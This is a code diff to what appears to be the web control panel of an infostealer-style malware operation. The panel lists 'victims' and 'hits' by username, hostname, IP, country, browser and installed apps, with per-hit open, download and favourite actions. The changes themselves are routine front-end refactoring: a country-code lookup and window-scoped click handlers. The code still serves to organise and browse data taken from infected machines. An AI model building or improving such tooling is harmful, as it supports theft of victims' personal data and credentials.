@@ -10,7 +10,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        /* ===== Full Theme ===== */
+        /* === Full Theme – same as before, kept intact === */
         * {
             scrollbar-width: thin;
             scrollbar-color: #6b7280 #111827;
@@ -800,7 +800,7 @@
                     <button class="hits-tab active" data-filter="all">All</button>
                     <button class="hits-tab" data-filter="favourited">Favourites</button>
                 </div>
-                <button class="btn btn-secondary btn-sm" onclick="refreshHits(true)">
+                <button class="btn btn-secondary btn-sm" onclick="window.refreshHits(true)">
                     <i class="fas fa-sync-alt" id="refreshIcon"></i> Refresh
                 </button>
             </div>
@@ -852,6 +852,36 @@
                     const isInvalid = !p.browser || p.browser === 'N/A';
                     return !isSensitive && !isFileEntry && !isInvalid;
                 });
+            }
+
+            // Convert full country name to ISO 2-letter code (approximate)
+            function getCountryCode(countryName) {
+                if (!countryName) return null;
+                const map = {
+                    'United States': 'US', 'United Kingdom': 'GB', 'Canada': 'CA',
+                    'Germany': 'DE', 'France': 'FR', 'Italy': 'IT', 'Spain': 'ES',
+                    'Russia': 'RU', 'China': 'CN', 'India': 'IN', 'Brazil': 'BR',
+                    'Australia': 'AU', 'Japan': 'JP', 'South Korea': 'KR', 'Mexico': 'MX',
+                    'South Africa': 'ZA', 'Egypt': 'EG', 'Saudi Arabia': 'SA', 'Turkey': 'TR',
+                    'Netherlands': 'NL', 'Sweden': 'SE', 'Poland': 'PL', 'Ukraine': 'UA',
+                    'Argentina': 'AR', 'Chile': 'CL', 'Colombia': 'CO', 'Peru': 'PE',
+                    'Nigeria': 'NG', 'Kenya': 'KE', 'Singapore': 'SG', 'Malaysia': 'MY',
+                    'Philippines': 'PH', 'Vietnam': 'VN', 'Thailand': 'TH', 'Indonesia': 'ID',
+                    'Pakistan': 'PK', 'Bangladesh': 'BD', 'Iran': 'IR', 'Iraq': 'IQ',
+                    'Israel': 'IL', 'UAE': 'AE', 'Belgium': 'BE', 'Switzerland': 'CH',
+                    'Austria': 'AT', 'Greece': 'GR', 'Portugal': 'PT', 'Ireland': 'IE',
+                    'Norway': 'NO', 'Finland': 'FI', 'Denmark': 'DK', 'Czechia': 'CZ',
+                    'Hungary': 'HU', 'Romania': 'RO', 'Bulgaria': 'BG', 'Serbia': 'RS',
+                    'Croatia': 'HR', 'Slovakia': 'SK', 'Slovenia': 'SI', 'Lithuania': 'LT',
+                    'Latvia': 'LV', 'Estonia': 'EE', 'New Zealand': 'NZ'
+                };
+                // Try exact match first, then partial
+                if (map[countryName]) return map[countryName];
+                // Check if countryName starts with any key
+                for (const [key, code] of Object.entries(map)) {
+                    if (countryName.startsWith(key)) return code;
+                }
+                return null;
             }
 
             function getFlagUrl(countryCode) {
@@ -910,6 +940,8 @@
                 updatePaginationInfo();
             }
 
+            window.renderTable = function() { renderTable(); };
+
             function renderTable() {
                 const start = (currentPage - 1) * PAGE_SIZE;
                 const end = Math.min(start + PAGE_SIZE, filteredVictims.length);
@@ -963,9 +995,9 @@
                     const username = v.username || 'Unknown';
                     const pcName = v.hostname || 'N/A';
                     const ip = v.ip || 'N/A';
-                    // Use country from database, fallback to 'Unknown'
+                    // Use country from database
                     const country = v.country || null;
-                    const countryCode = country ? country.slice(0, 2) : null;
+                    const countryCode = country ? getCountryCode(country) : null;
                     const flagUrl = countryCode ? getFlagUrl(countryCode) : null;
                     const tag = data.tag || 'Default';
                     const env = data.executionEnvironment || 'EXE';
@@ -979,7 +1011,6 @@
                     const favourites = v.favourited || false;
                     const time = v.timestamp || new Date().toISOString();
 
-                    // Generate row
                     html += `
                         <tr data-uuid="${v.id}">
                             <td>
@@ -990,7 +1021,7 @@
                             </td>
                             <td>
                                 <div class="ip-info">
-                                    <span class="ip-address" onclick="copyToClipboard('${escapeHtml(ip)}')">${escapeHtml(ip)}</span>
+                                    <span class="ip-address" onclick="window.copyToClipboard('${escapeHtml(ip)}')">${escapeHtml(ip)}</span>
                                     <span class="ip-country">
                                         ${flagUrl ? `<img src="${flagUrl}" class="country-flag" onerror="this.style.display='none'"> ${escapeHtml(country)}` : '<span class="country-unknown">Unknown</span>'}
                                     </span>
@@ -1011,7 +1042,7 @@
                                 ${renderIconGroup(apps, 'Apps')}
                             </td>
                             <td>
-                                <button class="fav-btn ${favourites ? 'fav-active' : ''}" onclick="toggleFavourite('${v.id}')" title="${favourites ? 'Remove from favourites' : 'Add to favourites'}">
+                                <button class="fav-btn ${favourites ? 'fav-active' : ''}" onclick="window.toggleFavourite('${v.id}')" title="${favourites ? 'Remove from favourites' : 'Add to favourites'}">
                                     <svg viewBox="0 0 24 24" fill="${favourites ? 'currentColor' : 'none'}" stroke="currentColor" stroke-width="2">
                                         <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>
                                     </svg>
@@ -1020,18 +1051,18 @@
                             <td class="time-cell">${formatTime(time)}</td>
                             <td>
                                 <div class="action-dropdown" data-idx="${idx}">
-                                    <button class="action-btn" onclick="toggleActionMenu(event, ${idx})">
+                                    <button class="action-btn" onclick="window.toggleActionMenu(event, ${idx})">
                                         Actions <i class="fas fa-chevron-down" style="font-size:10px;"></i>
                                     </button>
                                     <div class="action-menu" id="action-menu-${idx}">
                                         <div class="action-item" onclick="window.location.href='hit.html?id=${v.id}'">
                                             <i class="fas fa-eye"></i> Open
                                         </div>
-                                        <div class="action-item" onclick="downloadHit('${v.id}')">
+                                        <div class="action-item" onclick="window.downloadHit('${v.id}')">
                                             <i class="fas fa-download"></i> Download
                                         </div>
                                         <div class="action-divider"></div>
-                                        <div class="action-item" onclick="toggleFavourite('${v.id}')">
+                                        <div class="action-item" onclick="window.toggleFavourite('${v.id}')">
                                             <i class="fas fa-star"></i> ${favourites ? 'Unfavourite' : 'Favourite'}
                                         </div>
                                     </div>
@@ -1070,7 +1101,6 @@
 
                 let html = '<div class="icon-group">';
                 visible.forEach(name => {
-                    // Use lowercase for the filename
                     const safeName = encodeURIComponent(name.toLowerCase());
                     const imgSrc = `/icons/small/${folder}/${safeName}.png`;
                     html += `<div class="icon-img-wrapper">
@@ -1174,27 +1204,27 @@
                 tooltip.style.left = left + 'px';
             }
 
-            function copyToClipboard(text) {
+            window.copyToClipboard = function(text) {
                 if (!text || text === 'N/A') return;
                 navigator.clipboard.writeText(text).then(() => {
                     showToast('Copied to clipboard');
                 }).catch(() => {});
-            }
+            };
 
-            function toggleActionMenu(event, idx) {
+            window.toggleActionMenu = function(event, idx) {
                 event.stopPropagation();
                 const dropdown = document.querySelector(`.action-dropdown[data-idx="${idx}"]`);
                 if (!dropdown) return;
                 const wasOpen = dropdown.classList.contains('open');
                 document.querySelectorAll('.action-dropdown').forEach(d => d.classList.remove('open'));
                 if (!wasOpen) dropdown.classList.add('open');
-            }
+            };
 
             document.addEventListener('click', () => {
                 document.querySelectorAll('.action-dropdown').forEach(d => d.classList.remove('open'));
             });
 
-            async function toggleFavourite(id) {
+            window.toggleFavourite = async function(id) {
                 try {
                     const victim = allVictims.find(v => v.id === id);
                     if (!victim) return;
@@ -1210,11 +1240,11 @@
                 } catch (err) {
                     showToast('Error: ' + err.message, 'error');
                 }
-            }
+            };
 
-            async function downloadHit(id) {
+            window.downloadHit = async function(id) {
                 showToast('Download coming soon...', 'warning');
-            }
+            };
 
             function updatePaginationInfo() {
                 const totalPages = Math.ceil(filteredVictims.length / PAGE_SIZE) || 1;
@@ -1224,17 +1254,17 @@
                     return;
                 }
                 let html = '';
-                html += `<button class="page-btn" onclick="goToPage(1)" ${currentPage === 1 ? 'disabled' : ''}><i class="fas fa-angle-double-left"></i></button>`;
-                html += `<button class="page-btn" onclick="goToPage(${currentPage - 1})" ${currentPage === 1 ? 'disabled' : ''}><i class="fas fa-angle-left"></i></button>`;
+                html += `<button class="page-btn" onclick="window.goToPage(1)" ${currentPage === 1 ? 'disabled' : ''}><i class="fas fa-angle-double-left"></i></button>`;
+                html += `<button class="page-btn" onclick="window.goToPage(${currentPage - 1})" ${currentPage === 1 ? 'disabled' : ''}><i class="fas fa-angle-left"></i></button>`;
                 let start = Math.max(1, currentPage - 2);
                 let end = Math.min(totalPages, currentPage + 2);
                 if (start > 1) { html += `<span class="page-btn" style="border:none;background:transparent;cursor:default;">…</span>`; }
                 for (let i = start; i <= end; i++) {
-                    html += `<button class="page-btn ${i === currentPage ? 'active' : ''}" onclick="goToPage(${i})">${i}</button>`;
+                    html += `<button class="page-btn ${i === currentPage ? 'active' : ''}" onclick="window.goToPage(${i})">${i}</button>`;
                 }
                 if (end < totalPages) { html += `<span class="page-btn" style="border:none;background:transparent;cursor:default;">…</span>`; }
-                html += `<button class="page-btn" onclick="goToPage(${currentPage + 1})" ${currentPage === totalPages ? 'disabled' : ''}><i class="fas fa-angle-right"></i></button>`;
-                html += `<button class="page-btn" onclick="goToPage(${totalPages})" ${currentPage === totalPages ? 'disabled' : ''}><i class="fas fa-angle-double-right"></i></button>`;
+                html += `<button class="page-btn" onclick="window.goToPage(${currentPage + 1})" ${currentPage === totalPages ? 'disabled' : ''}><i class="fas fa-angle-right"></i></button>`;
+                html += `<button class="page-btn" onclick="window.goToPage(${totalPages})" ${currentPage === totalPages ? 'disabled' : ''}><i class="fas fa-angle-double-right"></i></button>`;
                 container.innerHTML = html;
             }
 
@@ -1246,7 +1276,7 @@
                 updatePaginationInfo();
             };
 
-            async function refreshHits(showToastMsg = false) {
+            window.refreshHits = async function(showToastMsg = false) {
                 const icon = document.getElementById('refreshIcon');
                 if (icon) icon.classList.add('fa-spin');
                 try {
@@ -1256,8 +1286,7 @@
                     showToast('Failed to refresh', 'error');
                 }
                 if (icon) icon.classList.remove('fa-spin');
-            }
-            window.refreshHits = refreshHits;
+            };
 
             async function fetchData() {
                 if (!currentUser) return;
